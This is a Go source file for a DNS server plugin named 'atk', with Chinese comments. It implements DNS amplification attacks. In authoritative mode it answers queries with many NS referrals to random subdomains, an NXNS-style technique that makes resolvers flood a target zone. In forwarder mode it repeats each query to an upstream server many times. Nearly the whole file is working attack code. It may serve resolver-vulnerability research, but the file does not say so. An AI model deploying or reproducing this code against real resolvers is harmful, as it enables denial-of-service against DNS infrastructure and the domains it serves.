package atk

import (
	"context"
	"github.com/miekg/dns"
	"github.com/pochard/commons/randstr"
	"net"
	"ohmydns2/plugin/pkg/proxy"
	"ohmydns2/plugin/pkg/request"
	"strings"
)

type Atk struct {
	proxies   []*proxy.Proxy
	serveType string
	magni     int
	zoneip4   string
	zoneip6   string
	ip6NS     string
	ip4NS     string
	ip6Addr   string
	ip4Addr   string
	target    string
}

func (a Atk) ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) (int, error) {
	state := request.Request{W: w, Req: r}
	// 转发器模式
	if a.serveType == "fdns" {
		opt := proxy.Options{ForceTCP: false, PreferUDP: true, HCRecursionDesired: true, HCDomain: "."}
		for i := a.magni; i > 0; i-- {
			_, _ = a.proxies[0].Connect(ctx, state, opt)
		}
		return 0, nil
	} else {
		//权威模式
		msg := new(dns.Msg)
		msg.SetReply(r)
		msg.Authoritative = true
		// 应对0x20
		qname := strings.ToLower(state.QName())
		// 请求的源地址
		switch a.validRequest(qname) {
		case 0:
			//	放大
			log.Infof("%v 查询 %v, 准备放大", state.IP(), state.Name())
			msg = a.Response(msg, 0)

		case 1:
			//观察
			log.Infof("%v 接收到请求: %v ask %v", a.ip6NS, state.IP(), state.Name())
			msg = a.Response(msg, 1)
		case -1:
			log.Infof("%v 接收到被修改的请求(QnameMini): %v ask %v", a.ip6NS, state.IP(), state.Name())
			msg = a.Response(msg, -1)
		case 2:
			//其他请求不响应
			log.Infof("%v 意外查询 %v", state.IP(), state.Name())
			return 0, nil
		}

		err := w.WriteMsg(msg)
		if err != nil {
			log.Info(err.Error())
			return dns.RcodeServerFailure, err
		}
		return 0, nil
	}

}

func (a Atk) Name() string {
	return "atk"
}

func (a Atk) Response(msg *dns.Msg, iptype int) *dns.Msg {
	if iptype == 0 { // 放大
		for i := 0; i < a.magni; i++ {
			rec := new(dns.NS)
			rec.Hdr = dns.RR_Header{Class: dns.ClassINET, Ttl: 10, Rrtype: dns.TypeNS}
			rec.Hdr.Name = msg.Question[0].Name
			ns := strings.ToLower(randstr.RandomAlphanumeric(10)) + "." + a.zoneip6
			log.Infof("生成NS:  %v", ns)
			rec.Ns = ns
			msg.Ns = append(msg.Ns, rec)
		}
	} else if iptype == 1 {
		//返回NXNS
		msg.Rcode = dns.RcodeNameError
		//授权记录
		rec := new(dns.NS)
		rec.Hdr = dns.RR_Header{Name: a.zoneip6, Class: dns.ClassINET, Ttl: 10, Rrtype: dns.TypeNS}
		rec.Ns = a.ip6NS
		msg.Ns = append(msg.Ns, rec)
		//胶水记录
		recaddr := new(dns.AAAA)
		recaddr.Hdr = dns.RR_Header{Name: a.ip6NS, Class: dns.ClassINET, Ttl: 10, Rrtype: dns.TypeAAAA}
		recaddr.AAAA = net.ParseIP(a.ip6Addr)
		msg.Extra = append(msg.Extra, recaddr)
	} else {
		//	特殊请求，返回权威信息
		//授权记录
		rec := new(dns.NS)
		rec.Hdr = dns.RR_Header{Name: a.zoneip6, Class: dns.ClassINET, Ttl: 10, Rrtype: dns.TypeNS}
		rec.Ns = a.ip6NS
		msg.Ns = append(msg.Ns, rec)
		//胶水记录
		recaddr := new(dns.AAAA)
		recaddr.Hdr = dns.RR_Header{Name: a.ip6NS, Class: dns.ClassINET, Ttl: 10, Rrtype: dns.TypeAAAA}
		recaddr.AAAA = net.ParseIP(a.ip6Addr)
		msg.Extra = append(msg.Extra, recaddr)
	}
	return msg
}
